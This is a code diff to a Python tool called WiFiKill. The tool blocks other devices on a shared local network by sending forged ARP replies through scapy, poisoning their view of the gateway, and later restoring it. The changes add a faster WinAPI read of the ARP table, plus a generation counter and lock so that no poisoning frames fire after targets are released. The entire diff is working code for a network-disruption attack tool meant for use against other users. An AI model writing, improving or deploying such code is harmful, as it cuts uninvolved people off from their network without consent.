@@ -31,7 +31,7 @@ except ImportError:
 WINDOWS = os.name == "nt"
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 APP_NAME = "WiFiKill"
-APP_VERSION = "2.6.2"
+APP_VERSION = "2.6.3"
 
 if getattr(sys, "frozen", False):
     APP_DIR = Path(sys.executable).resolve().parent
@@ -464,7 +464,73 @@ def get_netinfo(cidr: str | None = None) -> NetInfo:
     return ni
 
 
+def _arp_rows_to_table(rows) -> dict[str, str]:
+    """把 (dwAddr, phys_bytes, dwType) 行转成 {ip: mac}（纯函数，便于无网卡单测）。"""
+    table: dict[str, str] = {}
+    for ip_int, phys, typ in rows:
+        if typ == 2:                      # MIB_IPNET_TYPE_INVALID：已失效条目
+            continue
+        if len(phys) < 6:
+            continue
+        mac = ":".join(f"{b:02x}" for b in phys[:6])
+        ip = socket.inet_ntoa(struct.pack("<L", ip_int))
+        if mac == BROADCAST or mac.startswith("01:00:5e"):
+            continue
+        if ip.startswith(("224.", "239.", "255.")):
+            continue
+        table[ip] = mac
+    return table
+
+
+MAXLEN_PHYSADDR = 8
+
+
+def _arp_table_winapi() -> dict[str, str] | None:
+    """用 iphlpapi.GetIpNetTable 直接读 IPv4 邻居表，免起子进程。
+
+    优化动机：本机守护每 2 秒核对一次网关映射，而 `arp -a` 每次都要启动一个进程
+    （实测约 10–20 ms 的进程创建 + 解析开销，长期常驻累计明显）。
+    这里换成一次 API 调用；任何失败（非 Windows / 结构解析异常 / API 不支持）
+    都返回 None，由调用方回退到 `arp -a`，绝不因为优化而丢掉功能。
+    """
+    if not WINDOWS:
+        return None
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        class MIB_IPNETROW(ctypes.Structure):
+            _fields_ = [("dwIndex", wintypes.DWORD),
+                        ("dwPhysAddrLen", wintypes.DWORD),
+                        ("bPhysAddr", ctypes.c_ubyte * MAXLEN_PHYSADDR),
+                        ("dwAddr", wintypes.DWORD),
+                        ("dwType", wintypes.DWORD)]
+
+        iphlpapi = ctypes.windll.iphlpapi
+        size = wintypes.ULONG(0)
+        # 第一次调用只为拿所需缓冲区大小（返回 ERROR_INSUFFICIENT_BUFFER=122）
+        iphlpapi.GetIpNetTable(None, ctypes.byref(size), False)
+        if not size.value:
+            return {}
+        buf = ctypes.create_string_buffer(size.value)
+        if iphlpapi.GetIpNetTable(buf, ctypes.byref(size), False) != 0:
+            return None
+        n = ctypes.cast(buf, ctypes.POINTER(wintypes.DWORD)).contents.value
+        base = ctypes.addressof(buf) + ctypes.sizeof(wintypes.DWORD)
+        arr = (MIB_IPNETROW * int(n)).from_address(base)
+        rows = [(int(r.dwAddr), bytes(r.bPhysAddr[:r.dwPhysAddrLen]), int(r.dwType))
+                for r in arr]
+        return _arp_rows_to_table(rows)
+    except Exception as e:
+        LOG.emit("debug", f"GetIpNetTable 不可用，回退 arp -a：{e}")
+        return None
+
+
 def arp_table() -> dict[str, str]:
+    """读取系统 IPv4 邻居表：优先 WinAPI（免子进程），失败回退 `arp -a`。"""
+    fast = _arp_table_winapi()
+    if fast is not None:
+        return fast
     if WINDOWS:
         out = _run_hidden(["arp", "-a"], "gbk")
     else:
@@ -723,6 +789,13 @@ class Killer:
         self._thread: threading.Thread | None = None
         self._started = False
         self._send_errors = 0
+        # 会话代际 + 发送锁（对抗性审查第 7 轮）：
+        # 停止/恢复时先 +1 代际，使「还没检查代际的在途发送」直接作废；
+        # 而发送本身在 _send_lock 里排他，所以 stop() 里 +1 代际必须等当前 sendp 返回。
+        # 两者合起来保证：恢复帧一定排在最后，不会出现「恢复完又被补一枪投毒」的残留阻断。
+        self._gen = 0
+        self._send_lock = threading.RLock()
+        self._late_sends = 0   # 被代际作废的发送次数（供测试与日志观察）
 
     # --- 状态 ---
 
@@ -752,15 +825,30 @@ class Killer:
                  s.ARP(op=2, hwsrc=src_t, psrc=t.ip, hwdst=gw_mac, pdst=gw_ip))
         return to_target, to_gw
 
-    def _emit(self, t: Target, restore: bool = False, count: int = 1):
+    def _emit(self, t: Target, restore: bool = False, count: int = 1,
+              gen: int | None = None):
+        """发一帧（投毒或恢复）。
+
+        gen 非空时表示「本批属于第 gen 代会话」：一旦代际被推进（stop/remove/换网），
+        本批剩余发送全部作废——这正是关闭「恢复帧与在途投毒帧交叉」窗口的关键。
+        """
         s = scapy_mod()
         frames = self._frames(t, restore)
         for f in frames:
+            if gen is not None:
+                with self._send_lock:
+                    if gen != self._gen:
+                        self._late_sends += 1
+                        return
             if self.dry_run:
                 LOG.emit("debug", f"[演练] 告知 {f[1].pdst} ← {f[1].psrc} 的 MAC 是 {f[1].hwsrc}")
                 continue
             try:
-                s.sendp(f, iface=self.ni.iface, verbose=0, count=count)
+                with self._send_lock:
+                    if gen is not None and gen != self._gen:
+                        self._late_sends += 1
+                        return
+                    s.sendp(f, iface=self.ni.iface, verbose=0, count=count)
             except Exception as e:
                 self._send_errors += 1
                 raise BlockError(f"发送失败：{e}") from e
@@ -785,9 +873,18 @@ class Killer:
             self._started = True
             self._thread.start()
 
+    def _bump_gen(self) -> int:
+        """推进会话代际：等当前 sendp 返回后，让在途批次的剩余发送全部作废。"""
+        with self._send_lock:
+            self._gen += 1
+            return self._gen
+
     def _loop(self):
         cycles = 0
         while not self._stop.is_set():
+            # 每轮重新取代际：本轮中途发生 stop/remove/换网，则本轮剩余目标不再发送，
+            # 下一轮用新代际继续（不会误停其他目标的阻断）。
+            gen = self._gen
             with self._lock:
                 targets = list(self._targets.values())
             for t in targets:
@@ -795,7 +892,7 @@ class Killer:
                     break
                 try:
                     poison = self._should_poison(t, cycles)
-                    self._emit(t, restore=not poison)
+                    self._emit(t, restore=not poison, gen=gen)
                 except BlockError as e:
                     LOG.emit("warn", f"{t.ip} {e}")
                 except Exception as e:
@@ -882,6 +979,7 @@ class Killer:
             t = self._targets.pop(ip, None)
         if t:
             try:
+                self._bump_gen()          # 本目标的在途投毒批次立即作废
                 self._emit(t, restore=True, count=5)
             except Exception as e:
                 LOG.emit("warn", f"恢复 {ip} 失败：{e}")
@@ -915,14 +1013,15 @@ class Killer:
 
     def stop(self):
         self._stop.set()
+        self._bump_gen()     # 先作废在途发送，再等线程退出（顺序由 _send_lock 保证）
         th = self._thread
         if th and th.is_alive():
             th.join(timeout=3)
             if th.is_alive():
-                # 残余风险如实告知：线程可能正卡在 sendp 里，最后一批投毒帧会与
-                # 紧随其后的恢复帧交叉，目标可能仍处于被阻断状态。
-                LOG.emit("warn", "投毒线程未在 3 秒内退出，恢复帧可能与最后一批投毒帧交叉；"
-                                 "若目标仍无法上网，请再点一次「全部放行」")
+                # 代际 + 发送锁已保证「停止后不会再发出新的投毒帧」；仍卡住说明 sendp
+                # 本身没返回（驱动层异常），如实告知而不是假装干净。
+                LOG.emit("warn", "投毒线程未在 3 秒内退出（sendp 未返回，驱动层可能异常）；"
+                                 "后续恢复帧仍会排在最后，若目标仍无法上网请再点一次「全部放行」")
 
     _NET_KEYS = ("iface", "gateway_ip", "gateway_mac")
 
